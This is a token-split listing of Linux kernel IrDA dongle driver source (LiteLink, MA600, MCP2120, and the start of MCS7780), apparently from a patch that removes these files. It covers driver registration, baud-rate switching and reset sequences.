"include", "<", "linux", "/", "module", ".", "h", ">", "#", "include", "<", "linux", "/", "delay", ".", "h", ">", "#", "include", "<", "linux", "/", "init", ".", "h", ">", "#", "include", "<", "net", "/", "irda", "/", "irda", ".", "h", ">", "#", "include", "\"", "sir", "-", "dev", ".", "h", "\"", "#", "define", "MIN_DELAY", "25", "/", "*", "15", "us", ",", "but", "wait", "a", "little", "more", "to", "be", "sure", "*", "/", "#", "define", "MAX_DELAY", "10000", "/", "*", "1", "ms", "*", "/", "static", "int", "litelink_open", "(", "struct", "sir_dev", "*", "dev", ")", ";", "static", "int", "litelink_close", "(", "struct", "sir_dev", "*", "dev", ")", ";", "static", "int", "litelink_change_speed", "(", "struct", "sir_dev", "*", "dev", ",", "unsigned", "speed", ")", ";", "static", "int", "litelink_reset", "(", "struct", "sir_dev", "*", "dev", ")", ";", "/", "*", "These", "are", "the", "baudrates", "supported", "-", "9600", "must", "be", "last", "one", "!", "*", "/", "static", "unsigned", "baud_rates", "[", "]", "=", "{", "115200", ",", "57600", ",", "38400", ",", "19200", ",", "9600", "}", ";", "static", "struct", "dongle_driver", "litelink", "=", "{", ".", "owner", "=", "THIS_MODULE", ",", ".", "driver_name", "=", "\"", "Parallax", "LiteLink", "\"", ",", ".", "type", "=", "IRDA_LITELINK_DONGLE", ",", ".", "open", "=", "litelink_open", ",", ".", "close", "=", "litelink_close", ",", ".", "reset", "=", "litelink_reset", ",", ".", "set_speed", "=", "litelink_change_speed", ",", "}", ";", "static", "int", "__init", "litelink_sir_init", "(", "void", ")", "{", "return", "irda_register_dongle", "(", "&", "litelink", ")", ";", "}", "static", "void", "__exit", "litelink_sir_cleanup", "(", "void", ")", "{", "irda_unregister_dongle", "(", "&", "litelink", ")", ";", "}", "static", "int", "litelink_open", "(", "struct", "sir_dev", "*", "dev", ")", "{", "struct", "qos_info", "*", "qos", "=", "&", "dev", "-", ">", "qos", ";", "/", "*", "Power", "up", "dongle", "*", "/", "sirdev_set_dtr_rts", "(", "dev", ",", "TRUE", ",", "TRUE", ")", ";", "/", "*", "Set", "the", "speeds", "we", "can", "accept", "*", "/", "qos", "-", ">", "baud_rate", ".", "bits", "&", "=", "IR_115200", "|", "IR_57600", "|", "IR_38400", "|", "IR_19200", "|", "IR_9600", ";", "qos", "-", ">", "min_turn_time", ".", "bits", "=", "0x7f", ";", "/", "*", "Needs", "0", ".", "01", "ms", "*", "/", "irda_qos_bits_to_value", "(", "qos", ")", ";", "/", "*", "irda", "thread", "waits", "50", "msec", "for", "power", "settling", "*", "/", "return", "0", ";", "}", "static", "int", "litelink_close", "(", "struct", "sir_dev", "*", "dev", ")", "{", "/", "*", "Power", "off", "dongle", "*", "/", "sirdev_set_dtr_rts", "(", "dev", ",", "FALSE", ",", "FALSE", ")", ";", "return", "0", ";", "}", "/", "*", "*", "Function", "litelink_change_speed", "(", "task", ")", "*", "*", "Change", "speed", "of", "the", "Litelink", "dongle", ".", "To", "cycle", "through", "the", "available", "*", "baud", "rates", ",", "pulse", "RTS", "low", "for", "a", "few", "ms", ".", "*", "/", "static", "int", "litelink_change_speed", "(", "struct", "sir_dev", "*", "dev", ",", "unsigned", "speed", ")", "{", "int", "i", ";", "/", "*", "dongle", "already", "reset", "by", "irda", "-", "thread", "-", "current", "speed", "(", "dongle", "and", "*", "port", ")", "is", "the", "default", "speed", "(", "115200", "for", "litelink", "!", ")", "*", "/", "/", "*", "Cycle", "through", "avaiable", "baudrates", "until", "we", "reach", "the", "correct", "one", "*", "/", "for", "(", "i", "=", "0", ";", "baud_rates", "[", "i", "]", "!", "=", "speed", ";", "i", "+", "+)", "{", "/", "*", "end", "-", "of", "-", "list", "reached", "due", "to", "invalid", "speed", "request", "*", "/", "if", "(", "baud_rates", "[", "i", "]", "=", "=", "9600", ")", "break", ";", "/", "*", "Set", "DTR", ",", "clear", "RTS", "*", "/", "sirdev_set_dtr_rts", "(", "dev", ",", "FALSE", ",", "TRUE", ")", ";", "/", "*", "Sleep", "a", "minimum", "of", "15", "us", "*", "/", "udelay", "(", "MIN_DELAY", ")", ";", "/", "*", "Set", "DTR", ",", "Set", "RTS", "*", "/", "sirdev_set_dtr_rts", "(", "dev", ",", "TRUE", ",", "TRUE", ")", ";", "/", "*", "Sleep", "a", "minimum", "of", "15", "us", "*", "/", "udelay", "(", "MIN_DELAY", ")", ";", "}", "dev", "-", ">", "speed", "=", "baud_rates", "[", "i", "]", ";", "/", "*", "invalid", "baudrate", "should", "not", "happen", "-", "but", "if", ",", "we", "return", "-", "EINVAL", "and", "*", "the", "dongle", "configured", "for", "9600", "so", "the", "stack", "has", "a", "chance", "to", "recover", "*", "/", "return", "(", "dev", "-", ">", "speed", "=", "=", "speed", ")", "?", "0", ":", "-", "EINVAL", ";", "}", "/", "*", "*", "Function", "litelink_reset", "(", "task", ")", "*", "*", "Reset", "the", "Litelink", "type", "dongle", ".", "*", "*", "/", "static", "int", "litelink_reset", "(", "struct", "sir_dev", "*", "dev", ")", "{", "/", "*", "probably", "the", "power", "-", "up", "can", "be", "dropped", "here", ",", "but", "with", "only", "*", "15", "usec", "delay", "it", "'", "s", "not", "worth", "the", "risk", "unless", "somebody", "with", "*", "the", "hardware", "confirms", "it", "doesn", "'", "t", "break", "anything", ".", "..", "*", "/", "/", "*", "Power", "on", "dongle", "*", "/", "sirdev_set_dtr_rts", "(", "dev", ",", "TRUE", ",", "TRUE", ")", ";", "/", "*", "Sleep", "a", "minimum", "of", "15", "us", "*", "/", "udelay", "(", "MIN_DELAY", ")", ";", "/", "*", "Clear", "RTS", "to", "reset", "dongle", "*", "/", "sirdev_set_dtr_rts", "(", "dev", ",", "TRUE", ",", "FALSE", ")", ";", "/", "*", "Sleep", "a", "minimum", "of", "15", "us", "*", "/", "udelay", "(", "MIN_DELAY", ")", ";", "/", "*", "Go", "back", "to", "normal", "mode", "*", "/", "sirdev_set_dtr_rts", "(", "dev", ",", "TRUE", ",", "TRUE", ")", ";", "/", "*", "Sleep", "a", "minimum", "of", "15", "us", "*", "/", "udelay", "(", "MIN_DELAY", ")", ";", "/", "*", "This", "dongles", "speed", "defaults", "to", "115200", "bps", "*", "/", "dev", "-", ">", "speed", "=", "115200", ";", "return", "0", ";", "}", "MODULE_AUTHOR", "(", "\"", "Dag", "Brattli", "<", "dagb", "@", "cs", ".", "uit", ".", "no", ">", "\")", ";", "MODULE_DESCRIPTION", "(", "\"", "Parallax", "Litelink", "dongle", "driver", "\"", ");", "MODULE_LICENSE", "(", "\"", "GPL", "\"", ");", "MODULE_ALIAS", "(", "\"", "irda", "-", "dongle", "-", "5", "\"", ");", "/", "*", "IRDA_LITELINK_DONGLE", "*", "/", "/", "*", "*", "Function", "init_module", "(", "void", ")", "*", "*", "Initialize", "Litelink", "module", "*", "*", "/", "module_init", "(", "litelink_sir_init", ")", ";", "/", "*", "*", "Function", "cleanup_module", "(", "void", ")", "*", "*", "Cleanup", "Litelink", "module", "*", "*", "/", "module_exit", "(", "litelink_sir_cleanup", ")", ";", "@", "@", "-", "1", ",", "253", "+", "0", ",", "0", "@", "@", "/", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*", "*", "*", "Filename", ":", "ma600", ".", "c", "*", "Version", ":", "0", ".", "1", "*", "Description", ":", "Implementation", "of", "the", "MA600", "dongle", "*", "Status", ":", "Experimental", ".", "*", "Author", ":", "Leung", "<", "95Etwl", "@", "alumni", ".", "ee", ".", "ust", ".", "hk", ">", "http", ":", "//", "www", ".", "engsvr", ".", "ust", "/", "~", "eetwl95", "*", "Created", "at", ":", "Sat", "Jun", "10", "20", ":", "02", ":", "35", "2000", "*", "Modified", "at", ":", "Sat", "Aug", "16", "09", ":", "34", ":", "13", "2003", "*", "Modified", "by", ":", "Martin", "Diehl", "<", "mad", "@", "mdiehl", ".", "de", ">", "(", "modified", "for", "new", "sir_dev", ")", "*", "*", "Note", ":", "very", "thanks", "to", "Mr", ".", "Maru", "Wang", "<", "maru", "@", "mobileaction", ".", "com", ".", "tw", ">", "for", "providing", "*", "information", "on", "the", "MA600", "dongle", "*", "*", "Copyright", "(", "c", ")", "2000", "Leung", ",", "All", "Rights", "Reserved", ".", "*", "*", "This", "program", "is", "free", "software", ";", "you", "can", "redistribute", "it", "and", "/", "or", "*", "modify", "it", "under", "the", "terms", "of", "the", "GNU", "General", "Public", "License", "as", "*", "published", "by", "the", "Free", "Software", "Foundation", ";", "either", "version", "2", "of", "*", "the", "License", ",", "or", "(", "at", "your", "option", ")", "any", "later", "version", ".", "*", "*", "This", "program", "is", "distributed", "in", "the", "hope", "that", "it", "will", "be", "useful", ",", "*", "but", "WITHOUT", "ANY", "WARRANTY", ";", "without", "even", "the", "implied", "warranty", "of", "*", "MERCHANTABILITY", "or", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", ".", "See", "the", "*", "GNU", "General", "Public", "License", "for", "more", "details", ".", "*", "*", "You", "should", "have", "received", "a", "copy", "of", "the", "GNU", "General", "Public", "License", "*", "along", "with", "this", "program", ";", "if", "not", ",", "see", "<", "http", ":", "//", "www", ".", "gnu", ".", "org", "/", "licenses", "/", ">.", "*", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*/", "#", "include", "<", "linux", "/", "module", ".", "h", ">", "#", "include", "<", "linux", "/", "delay", ".", "h", ">", "#", "include", "<", "linux", "/", "init", ".", "h", ">", "#", "include", "<", "net", "/", "irda", "/", "irda", ".", "h", ">", "#", "include", "\"", "sir", "-", "dev", ".", "h", "\"", "static", "int", "ma600_open", "(", "struct", "sir_dev", "*", ");", "static", "int", "ma600_close", "(", "struct", "sir_dev", "*", ");", "static", "int", "ma600_change_speed", "(", "struct", "sir_dev", "*", ",", "unsigned", ")", ";", "static", "int", "ma600_reset", "(", "struct", "sir_dev", "*", ");", "/", "*", "control", "byte", "for", "MA600", "*", "/", "#", "define", "MA600_9600", "0x00", "#", "define", "MA600_19200", "0x01", "#", "define", "MA600_38400", "0x02", "#", "define", "MA600_57600", "0x03", "#", "define", "MA600_115200", "0x04", "#", "define", "MA600_DEV_ID1", "0x05", "#", "define", "MA600_DEV_ID2", "0x06", "#", "define", "MA600_2400", "0x08", "static", "struct", "dongle_driver", "ma600", "=", "{", ".", "owner", "=", "THIS_MODULE", ",", ".", "driver_name", "=", "\"", "MA600", "\"", ",", ".", "type", "=", "IRDA_MA600_DONGLE", ",", ".", "open", "=", "ma600_open", ",", ".", "close", "=", "ma600_close", ",", ".", "reset", "=", "ma600_reset", ",", ".", "set_speed", "=", "ma600_change_speed", ",", "}", ";", "static", "int", "__init", "ma600_sir_init", "(", "void", ")", "{", "return", "irda_register_dongle", "(", "&", "ma600", ")", ";", "}", "static", "void", "__exit", "ma600_sir_cleanup", "(", "void", ")", "{", "irda_unregister_dongle", "(", "&", "ma600", ")", ";", "}", "/", "*", "Power", "on", ":", "(", "0", ")", "Clear", "RTS", "and", "DTR", "for", "1", "second", "(", "1", ")", "Set", "RTS", "and", "DTR", "for", "1", "second", "(", "2", ")", "9600", "bps", "now", "Note", ":", "assume", "RTS", ",", "DTR", "are", "clear", "before", "*", "/", "static", "int", "ma600_open", "(", "struct", "sir_dev", "*", "dev", ")", "{", "struct", "qos_info", "*", "qos", "=", "&", "dev", "-", ">", "qos", ";", "sirdev_set_dtr_rts", "(", "dev", ",", "TRUE", ",", "TRUE", ")", ";", "/", "*", "Explicitly", "set", "the", "speeds", "we", "can", "accept", "*", "/", "qos", "-", ">", "baud_rate", ".", "bits", "&", "=", "IR_2400", "|", "IR_9600", "|", "IR_19200", "|", "IR_38400", "|", "IR_57600", "|", "IR_115200", ";", "/", "*", "Hm", ",", "0x01", "means", "10ms", "-", "for", ">", "=", "1ms", "we", "would", "need", "0x07", "*", "/", "qos", "-", ">", "min_turn_time", ".", "bits", "=", "0x01", ";", "/", "*", "Needs", "at", "least", "1", "ms", "*", "/", "irda_qos_bits_to_value", "(", "qos", ")", ";", "/", "*", "irda", "thread", "waits", "50", "msec", "for", "power", "settling", "*", "/", "return", "0", ";", "}", "static", "int", "ma600_close", "(", "struct", "sir_dev", "*", "dev", ")", "{", "/", "*", "Power", "off", "dongle", "*", "/", "sirdev_set_dtr_rts", "(", "dev", ",", "FALSE", ",", "FALSE", ")", ";", "return", "0", ";", "}", "static", "__u8", "get_control_byte", "(", "__u32", "speed", ")", "{", "__u8", "byte", ";", "switch", "(", "speed", ")", "{", "default", ":", "case", "115200", ":", "byte", "=", "MA600_115200", ";", "break", ";", "case", "57600", ":", "byte", "=", "MA600_57600", ";", "break", ";", "case", "38400", ":", "byte", "=", "MA600_38400", ";", "break", ";", "case", "19200", ":", "byte", "=", "MA600_19200", ";", "break", ";", "case", "9600", ":", "byte", "=", "MA600_9600", ";", "break", ";", "case", "2400", ":", "byte", "=", "MA600_2400", ";", "break", ";", "}", "return", "byte", ";", "}", "/", "*", "*", "Function", "ma600_change_speed", "(", "dev", ",", "speed", ")", "*", "*", "Set", "the", "speed", "for", "the", "MA600", "type", "dongle", ".", "*", "*", "The", "dongle", "has", "already", "been", "reset", "to", "a", "known", "state", "(", "dongle", "default", ")", "*", "We", "cycle", "through", "speeds", "by", "pulsing", "RTS", "low", "and", "then", "high", ".", "*", "/", "/", "*", "*", "Function", "ma600_change_speed", "(", "dev", ",", "speed", ")", "*", "*", "Set", "the", "speed", "for", "the", "MA600", "type", "dongle", ".", "*", "*", "Algorithm", "*", "1", ".", "Reset", "(", "already", "done", "by", "irda", "thread", "state", "machine", ")", "*", "2", ".", "clear", "RTS", ",", "set", "DTR", "and", "wait", "for", "1ms", "*", "3", ".", "send", "Control", "Byte", "to", "the", "MA600", "through", "TXD", "to", "set", "new", "baud", "rate", "*", "wait", "until", "the", "stop", "bit", "of", "Control", "Byte", "is", "sent", "(", "for", "9600", "baud", "rate", ",", "*", "it", "takes", "about", "10", "msec", ")", "*", "4", ".", "set", "RTS", ",", "set", "DTR", "(", "return", "to", "NORMAL", "Operation", ")", "*", "5", ".", "wait", "at", "least", "10", "ms", ",", "new", "setting", "(", "baud", "rate", ",", "etc", ")", "takes", "effect", "here", "*", "after", "*", "/", "/", "*", "total", "delays", "are", "only", "about", "20ms", "-", "let", "'", "s", "just", "sleep", "for", "now", "to", "*", "avoid", "the", "state", "machine", "complexity", "before", "we", "get", "things", "working", "*", "/", "static", "int", "ma600_change_speed", "(", "struct", "sir_dev", "*", "dev", ",", "unsigned", "speed", ")", "{", "u8", "byte", ";", "pr_debug", "(", "\"%", "s", "(", "),", "speed", "=", "%", "d", "(", "was", "%", "d", ")", "\\", "n", "\"", ",", "__func__", ",", "speed", ",", "dev", "-", ">", "speed", ")", ";", "/", "*", "dongle", "already", "reset", ",", "dongle", "and", "port", "at", "default", "speed", "(", "9600", ")", "*", "/", "/", "*", "Set", "RTS", "low", "for", "1", "ms", "*", "/", "sirdev_set_dtr_rts", "(", "dev", ",", "TRUE", ",", "FALSE", ")", ";", "mdelay", "(", "1", ")", ";", "/", "*", "Write", "control", "byte", "*", "/", "byte", "=", "get_control_byte", "(", "speed", ")", ";", "sirdev_raw_write", "(", "dev", ",", "&", "byte", ",", "sizeof", "(", "byte", ")", ");", "/", "*", "Wait", "at", "least", "10ms", ":", "fake", "wait_until_sent", "-", "10", "bits", "at", "9600", "baud", "*", "/", "msleep", "(", "15", ")", ";", "/", "*", "old", "ma600", "uses", "15ms", "*", "/", "#", "if", "1", "/", "*", "read", "-", "back", "of", "the", "control", "byte", ".", "ma600", "is", "the", "first", "dongle", "driver", "*", "which", "uses", "this", "so", "there", "might", "be", "some", "unidentified", "issues", ".", "*", "Disable", "this", "in", "case", "of", "problems", "with", "readback", ".", "*", "/", "sirdev_raw_read", "(", "dev", ",", "&", "byte", ",", "sizeof", "(", "byte", ")", ");", "if", "(", "byte", "!", "=", "get_control_byte", "(", "speed", ")", ")", "{", "net_warn_ratelimited", "(", "\"%", "s", "(", "):", "bad", "control", "byte", "read", "-", "back", "%", "02x", "!", "=", "%", "02x", "\\", "n", "\"", ",", "__func__", ",", "(", "unsigned", ")", "byte", ",", "(", "unsigned", ")", "get_control_byte", "(", "speed", ")", ");", "return", "-", "1", ";", "}", "else", "pr_debug", "(", "\"%", "s", "(", ")", "control", "byte", "write", "read", "OK", "\\", "n", "\"", ",", "__func__", ")", ";", "#", "endif", "/", "*", "Set", "DTR", ",", "Set", "RTS", "*", "/", "sirdev_set_dtr_rts", "(", "dev", ",", "TRUE", ",", "TRUE", ")", ";", "/", "*", "Wait", "at", "least", "10ms", "*", "/", "msleep", "(", "10", ")", ";", "/", "*", "dongle", "is", "now", "switched", "to", "the", "new", "speed", "*", "/", "dev", "-", ">", "speed", "=", "speed", ";", "return", "0", ";", "}", "/", "*", "*", "Function", "ma600_reset", "(", "dev", ")", "*", "*", "This", "function", "resets", "the", "ma600", "dongle", ".", "*", "*", "Algorithm", ":", "*", "0", ".", "DTR", "=", "0", ",", "RTS", "=", "1", "and", "wait", "10", "ms", "*", "1", ".", "DTR", "=", "1", ",", "RTS", "=", "1", "and", "wait", "10", "ms", "*", "2", ".", "9600", "bps", "now", "*", "/", "/", "*", "total", "delays", "are", "only", "about", "20ms", "-", "let", "'", "s", "just", "sleep", "for", "now", "to", "*", "avoid", "the", "state", "machine", "complexity", "before", "we", "get", "things", "working", "*", "/", "static", "int", "ma600_reset", "(", "struct", "sir_dev", "*", "dev", ")", "{", "/", "*", "Reset", "the", "dongle", ":", "set", "DTR", "low", "for", "10", "ms", "*", "/", "sirdev_set_dtr_rts", "(", "dev", ",", "FALSE", ",", "TRUE", ")", ";", "msleep", "(", "10", ")", ";", "/", "*", "Go", "back", "to", "normal", "mode", "*", "/", "sirdev_set_dtr_rts", "(", "dev", ",", "TRUE", ",", "TRUE", ")", ";", "msleep", "(", "10", ")", ";", "dev", "-", ">", "speed", "=", "9600", ";", "/", "*", "That", "'", "s", "the", "dongle", "-", "default", "*", "/", "return", "0", ";", "}", "MODULE_AUTHOR", "(", "\"", "Leung", "<", "95Etwl", "@", "alumni", ".", "ee", ".", "ust", ".", "hk", ">", "http", ":", "//", "www", ".", "engsvr", ".", "ust", "/", "~", "eetwl95", "\"", ");", "MODULE_DESCRIPTION", "(", "\"", "MA600", "dongle", "driver", "version", "0", ".", "1", "\"", ");", "MODULE_LICENSE", "(", "\"", "GPL", "\"", ");", "MODULE_ALIAS", "(", "\"", "irda", "-", "dongle", "-", "11", "\"", ");", "/", "*", "IRDA_MA600_DONGLE", "*", "/", "module_init", "(", "ma600_sir_init", ")", ";", "module_exit", "(", "ma600_sir_cleanup", ")", ";", "@", "@", "-", "1", ",", "224", "+", "0", ",", "0", "@", "@", "/", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*", "*", "*", "*", "Filename", ":", "mcp2120", ".", "c", "*", "Version", ":", "1", ".", "0", "*", "Description", ":", "Implementation", "for", "the", "MCP2120", "(", "Microchip", ")", "*", "Status", ":", "Experimental", ".", "*", "Author", ":", "Felix", "Tang", "(", "tangf", "@", "eyetap", ".", "org", ")", "*", "Created", "at", ":", "Sun", "Mar", "31", "19", ":", "32", ":", "12", "EST", "2002", "*", "Based", "on", "code", "by", ":", "Dag", "Brattli", "<", "dagb", "@", "cs", ".", "uit", ".", "no", ">", "*", "*", "Copyright", "(", "c", ")", "2002", "Felix", "Tang", ",", "All", "Rights", "Reserved", ".", "*", "*", "This", "program", "is", "free", "software", ";", "you", "can", "redistribute", "it", "and", "/", "or", "*", "modify", "it", "under", "the", "terms", "of", "the", "GNU", "General", "Public", "License", "as", "*", "published", "by", "the", "Free", "Software", "Foundation", ";", "either", "version", "2", "of", "*", "the", "License", ",", "or", "(", "at", "your", "option", ")", "any", "later", "version", ".", "*", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*/", "#", "include", "<", "linux", "/", "module", ".", "h", ">", "#", "include", "<", "linux", "/", "delay", ".", "h", ">", "#", "include", "<", "linux", "/", "init", ".", "h", ">", "#", "include", "<", "net", "/", "irda", "/", "irda", ".", "h", ">", "#", "include", "\"", "sir", "-", "dev", ".", "h", "\"", "static", "int", "mcp2120_reset", "(", "struct", "sir_dev", "*", "dev", ")", ";", "static", "int", "mcp2120_open", "(", "struct", "sir_dev", "*", "dev", ")", ";", "static", "int", "mcp2120_close", "(", "struct", "sir_dev", "*", "dev", ")", ";", "static", "int", "mcp2120_change_speed", "(", "struct", "sir_dev", "*", "dev", ",", "unsigned", "speed", ")", ";", "#", "define", "MCP2120_9600", "0x87", "#", "define", "MCP2120_19200", "0x8B", "#", "define", "MCP2120_38400", "0x85", "#", "define", "MCP2120_57600", "0x83", "#", "define", "MCP2120_115200", "0x81", "#", "define", "MCP2120_COMMIT", "0x11", "static", "struct", "dongle_driver", "mcp2120", "=", "{", ".", "owner", "=", "THIS_MODULE", ",", ".", "driver_name", "=", "\"", "Microchip", "MCP2120", "\"", ",", ".", "type", "=", "IRDA_MCP2120_DONGLE", ",", ".", "open", "=", "mcp2120_open", ",", ".", "close", "=", "mcp2120_close", ",", ".", "reset", "=", "mcp2120_reset", ",", ".", "set_speed", "=", "mcp2120_change_speed", ",", "}", ";", "static", "int", "__init", "mcp2120_sir_init", "(", "void", ")", "{", "return", "irda_register_dongle", "(", "&", "mcp2120", ")", ";", "}", "static", "void", "__exit", "mcp2120_sir_cleanup", "(", "void", ")", "{", "irda_unregister_dongle", "(", "&", "mcp2120", ")", ";", "}", "static", "int", "mcp2120_open", "(", "struct", "sir_dev", "*", "dev", ")", "{", "struct", "qos_info", "*", "qos", "=", "&", "dev", "-", ">", "qos", ";", "/", "*", "seems", "no", "explicit", "power", "-", "on", "required", "here", "and", "reset", "switching", "it", "on", "anyway", "*", "/", "qos", "-", ">", "baud_rate", ".", "bits", "&", "=", "IR_9600", "|", "IR_19200", "|", "IR_38400", "|", "IR_57600", "|", "IR_115200", ";", "qos", "-", ">", "min_turn_time", ".", "bits", "=", "0x01", ";", "irda_qos_bits_to_value", "(", "qos", ")", ";", "return", "0", ";", "}", "static", "int", "mcp2120_close", "(", "struct", "sir_dev", "*", "dev", ")", "{", "/", "*", "Power", "off", "dongle", "*", "/", "/", "*", "reset", "and", "inhibit", "mcp2120", "*", "/", "sirdev_set_dtr_rts", "(", "dev", ",", "TRUE", ",", "TRUE", ")", ";", "/", "/", "sirdev_set_dtr_rts", "(", "dev", ",", "FALSE", ",", "FALSE", ")", ";", "return", "0", ";", "}", "/", "*", "*", "Function", "mcp2120_change_speed", "(", "dev", ",", "speed", ")", "*", "*", "Set", "the", "speed", "for", "the", "MCP2120", ".", "*", "*", "/", "#", "define", "MCP2120_STATE_WAIT_SPEED", "(", "SIRDEV_STATE_DONGLE_SPEED", "+", "1", ")", "static", "int", "mcp2120_change_speed", "(", "struct", "sir_dev", "*", "dev", ",", "unsigned", "speed", ")", "{", "unsigned", "state", "=", "dev", "-", ">", "fsm", ".", "substate", ";", "unsigned", "delay", "=", "0", ";", "u8", "control", "[", "2", "]", ";", "static", "int", "ret", "=", "0", ";", "switch", "(", "state", ")", "{", "case", "SIRDEV_STATE_DONGLE_SPEED", ":", "/", "*", "Set", "DTR", "to", "enter", "command", "mode", "*", "/", "sirdev_set_dtr_rts", "(", "dev", ",", "TRUE", ",", "FALSE", ")", ";", "udelay", "(", "500", ")", ";", "ret", "=", "0", ";", "switch", "(", "speed", ")", "{", "default", ":", "speed", "=", "9600", ";", "ret", "=", "-", "EINVAL", ";", "/", "*", "fall", "through", "*", "/", "case", "9600", ":", "control", "[", "0", "]", "=", "MCP2120_9600", ";", "/", "/", "printk", "(", "\"", "mcp2120", "9600", "\\", "n", "\"", ");", "break", ";", "case", "19200", ":", "control", "[", "0", "]", "=", "MCP2120_19200", ";", "/", "/", "printk", "(", "\"", "mcp2120", "19200", "\\", "n", "\"", ");", "break", ";", "case", "34800", ":", "control", "[", "0", "]", "=", "MCP2120_38400", ";", "/", "/", "printk", "(", "\"", "mcp2120", "38400", "\\", "n", "\"", ");", "break", ";", "case", "57600", ":", "control", "[", "0", "]", "=", "MCP2120_57600", ";", "/", "/", "printk", "(", "\"", "mcp2120", "57600", "\\", "n", "\"", ");", "break", ";", "case", "115200", ":", "control", "[", "0", "]", "=", "MCP2120_115200", ";", "/", "/", "printk", "(", "\"", "mcp2120", "115200", "\\", "n", "\"", ");", "break", ";", "}", "control", "[", "1", "]", "=", "MCP2120_COMMIT", ";", "/", "*", "Write", "control", "bytes", "*", "/", "sirdev_raw_write", "(", "dev", ",", "control", ",", "2", ")", ";", "dev", "-", ">", "speed", "=", "speed", ";", "state", "=", "MCP2120_STATE_WAIT_SPEED", ";", "delay", "=", "100", ";", "/", "/", "printk", "(", "\"", "mcp2120_change_speed", ":", "dongle_speed", "\\", "n", "\"", ");", "break", ";", "case", "MCP2120_STATE_WAIT_SPEED", ":", "/", "*", "Go", "back", "to", "normal", "mode", "*", "/", "sirdev_set_dtr_rts", "(", "dev", ",", "FALSE", ",", "FALSE", ")", ";", "/", "/", "printk", "(", "\"", "mcp2120_change_speed", ":", "mcp_wait", "\\", "n", "\"", ");", "break", ";", "default", ":", "net_err_ratelimited", "(", "\"%", "s", "(", "),", "undefine", "state", "%", "d", "\\", "n", "\"", ",", "__func__", ",", "state", ")", ";", "ret", "=", "-", "EINVAL", ";", "break", ";", "}", "dev", "-", ">", "fsm", ".", "substate", "=", "state", ";", "return", "(", "delay", ">", "0", ")", "?", "delay", ":", "ret", ";", "}", "/", "*", "*", "Function", "mcp2120_reset", "(", "driver", ")", "*", "*", "This", "function", "resets", "the", "mcp2120", "dongle", ".", "*", "*", "Info", ":", "-", "set", "RTS", "to", "reset", "mcp2120", "*", "-", "set", "DTR", "to", "set", "mcp2120", "software", "command", "mode", "*", "-", "mcp2120", "defaults", "to", "9600", "baud", "after", "reset", "*", "*", "Algorithm", ":", "*", "0", ".", "Set", "RTS", "to", "reset", "mcp2120", ".", "*", "1", ".", "Clear", "RTS", "and", "wait", "for", "device", "reset", "timer", "of", "30", "ms", "(", "max", ")", ".", "*", "*", "/", "#", "define", "MCP2120_STATE_WAIT1_RESET", "(", "SIRDEV_STATE_DONGLE_RESET", "+", "1", ")", "#", "define", "MCP2120_STATE_WAIT2_RESET", "(", "SIRDEV_STATE_DONGLE_RESET", "+", "2", ")", "static", "int", "mcp2120_reset", "(", "struct", "sir_dev", "*", "dev", ")", "{", "unsigned", "state", "=", "dev", "-", ">", "fsm", ".", "substate", ";", "unsigned", "delay", "=", "0", ";", "int", "ret", "=", "0", ";", "switch", "(", "state", ")", "{", "case", "SIRDEV_STATE_DONGLE_RESET", ":", "/", "/", "printk", "(", "\"", "mcp2120_reset", ":", "dongle_reset", "\\", "n", "\"", ");", "/", "*", "Reset", "dongle", "by", "setting", "RTS", "*", "/", "sirdev_set_dtr_rts", "(", "dev", ",", "TRUE", ",", "TRUE", ")", ";", "state", "=", "MCP2120_STATE_WAIT1_RESET", ";", "delay", "=", "50", ";", "break", ";", "case", "MCP2120_STATE_WAIT1_RESET", ":", "/", "/", "printk", "(", "\"", "mcp2120_reset", ":", "mcp2120_wait1", "\\", "n", "\"", ");", "/", "*", "clear", "RTS", "and", "wait", "for", "at", "least", "30", "ms", ".", "*", "/", "sirdev_set_dtr_rts", "(", "dev", ",", "FALSE", ",", "FALSE", ")", ";", "state", "=", "MCP2120_STATE_WAIT2_RESET", ";", "delay", "=", "50", ";", "break", ";", "case", "MCP2120_STATE_WAIT2_RESET", ":", "/", "/", "printk", "(", "\"", "mcp2120_reset", "mcp2120_wait2", "\\", "n", "\"", ");", "/", "*", "Go", "back", "to", "normal", "mode", "*", "/", "sirdev_set_dtr_rts", "(", "dev", ",", "FALSE", ",", "FALSE", ")", ";", "break", ";", "default", ":", "net_err_ratelimited", "(", "\"%", "s", "(", "),", "undefined", "state", "%", "d", "\\", "n", "\"", ",", "__func__", ",", "state", ")", ";", "ret", "=", "-", "EINVAL", ";", "break", ";", "}", "dev", "-", ">", "fsm", ".", "substate", "=", "state", ";", "return", "(", "delay", ">", "0", ")", "?", "delay", ":", "ret", ";", "}", "MODULE_AUTHOR", "(", "\"", "Felix", "Tang", "<", "tangf", "@", "eyetap", ".", "org", ">", "\")", ";", "MODULE_DESCRIPTION", "(", "\"", "Microchip", "MCP2120", "\"", ");", "MODULE_LICENSE", "(", "\"", "GPL", "\"", ");", "MODULE_ALIAS", "(", "\"", "irda", "-", "dongle", "-", "9", "\"", ");", "/", "*", "IRDA_MCP2120_DONGLE", "*", "/", "module_init", "(", "mcp2120_sir_init", ")", ";", "module_exit", "(", "mcp2120_sir_cleanup", ")", ";", "@", "@", "-", "1", ",", "990", "+", "0", ",", "0", "@", "@", "/", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*", "*", "*", "Filename", ":", "mcs7780", ".", "c", "*", "Version", ":", "0", ".", "4", "-", "alpha", "*", "Description", ":", "Irda", "MosChip", "USB", "Dongle", "Driver", "*", "Authors", ":", "Lukasz", "Stelmach", "<", "stlman", "@", "poczta", ".", "fm", ">", 